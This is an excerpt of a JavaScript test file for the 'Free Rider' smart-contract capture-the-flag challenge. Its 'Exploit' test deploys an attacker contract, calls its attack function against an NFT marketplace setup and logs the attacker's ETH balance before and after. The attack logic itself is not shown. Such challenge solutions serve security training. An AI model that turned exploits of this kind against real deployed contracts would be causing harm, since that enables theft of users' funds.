...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        console.log("Attacker balance [before]: ", (await (await ethers.provider.getBalance(attacker.address)).toString()/10**18));
        const FreeRiderAttackFactory = await ethers.getContractFactory('FreeRiderAttack', attacker);
        this.freeRiderAttack = await FreeRiderAttackFactory.deploy(
            this.nft.address, 
        ...
        await this.freeRiderAttack.connect(attacker).attack(this.weth.address, NFT_PRICE);


        console.log("Attacker balance [after]:  ", (await (await ethers.provider.getBalance(attacker.address)).toString()/10**18));
    });
